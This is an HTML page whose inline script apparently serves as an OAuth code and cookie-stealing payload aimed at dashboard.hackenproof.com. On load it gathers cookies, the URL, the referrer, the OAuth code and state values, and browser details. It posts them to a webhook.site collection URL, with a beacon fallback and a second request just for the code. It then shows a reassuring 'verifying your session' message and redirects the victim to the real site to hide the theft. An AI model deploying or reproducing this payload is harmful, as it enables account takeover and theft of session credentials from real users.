<!DOCTYPE html>
<html>
<head>
    <title>Processing...</title>
</head>
<body>
    <h1>Loading...</h1>

    <script>
        // ============================================
        // CONFIGURATION - UPDATE THESE TWO URLS
        // ============================================
        const WEBHOOK_URL = 'https://webhook.site/c2862964-a890-47e0-b623-e4c0aea90095';
        const TARGET_DOMAIN = 'https://dashboard.hackenproof.com';

        // ============================================
        // STEP 1: Capture ALL data from the URL
        // ============================================
        const fullUrl = window.location.href;
        const referrer = document.referrer;
        const cookies = document.cookie;
        const urlParams = new URLSearchParams(window.location.search);
        
        // Capture OAuth parameters if they exist
        const oauthCode = urlParams.get('code');
        const state = urlParams.get('state');
        const sessionState = urlParams.get('session_state');
        const error = urlParams.get('error');

        // ============================================
        // STEP 2: Build the data payload
        // ============================================
        const payload = {
            timestamp: new Date().toISOString(),
            fullUrl: fullUrl,
            referrer: referrer,
            cookies: cookies,
            oauthCode: oauthCode,
            state: state,
            sessionState: sessionState,
            error: error,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screenResolution: screen.width + 'x' + screen.height
        };

        console.log('Sending payload:', payload);

        // ============================================
        // STEP 3: Send data with proper fetch
        // ============================================
        // Use keepalive: true to ensure request completes even if page redirects
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'cors', // Changed from 'no-cors' to see errors
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload),
            keepalive: true // CRITICAL: keeps request alive during redirect
        })
        .then(response => {
            if (response.ok) {
                console.log('Data sent successfully to webhook');
            } else {
                console.warn('Webhook responded with status:', response.status);
            }
        })
        .catch(error => {
            console.error('Failed to send data to webhook:', error);
            // Try fallback: send data via image beacon
            try {
                const beaconUrl = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
                navigator.sendBeacon(beaconUrl);
                console.log('Fallback beacon sent');
            } catch (be) {
                console.error('Beacon also failed:', be);
            }
        });

        // ============================================
        // STEP 4: Handle OAuth code (if present)
        // ============================================
        if (oauthCode) {
            console.log('OAuth Code detected:', oauthCode.substring(0, 10) + '...');
            
            // Send a SECONDARY request specifically for the code
            fetch(WEBHOOK_URL + '?event=oauth_code_captured', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    oauthCode: oauthCode,
                    state: state,
                    fullUrl: fullUrl
                }),
                keepalive: true
            }).catch(() => {}); // Silent fail

            // Show user a message then redirect
            document.body.innerHTML = `
                <h1>Redirecting to dashboard...</h1>
                <p>Please wait while we verify your session.</p>
                <p><small>If you are not redirected automatically, <a href="${TARGET_DOMAIN}/dashboard">click here</a></small></p>
            `;

            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = TARGET_DOMAIN + '/dashboard';
            }, 2000);

        } else {
            // No OAuth code - send user to REAL login page
            console.log('No OAuth code detected, redirecting to login');
            
            // Show redirect message
            document.body.innerHTML = `
                <h1>Redirecting to login...</h1>
                <p>Please wait while we verify your session.</p>
            `;

            // Redirect to REAL login after 1.5 seconds
            setTimeout(() => {
                window.location.href = TARGET_DOMAIN + '/login';
            }, 1500);
        }
    </script>

    <!-- Fallback: HTML-based redirect if JavaScript fails -->
    <noscript>
        <meta http-equiv="refresh" content="2;url=https://dashboard.hackenproof.com/login">
        <p>JavaScript is disabled. <a href="https://dashboard.hackenproof.com/login">Click here to login</a></p>
    </noscript>

</body>
</html>
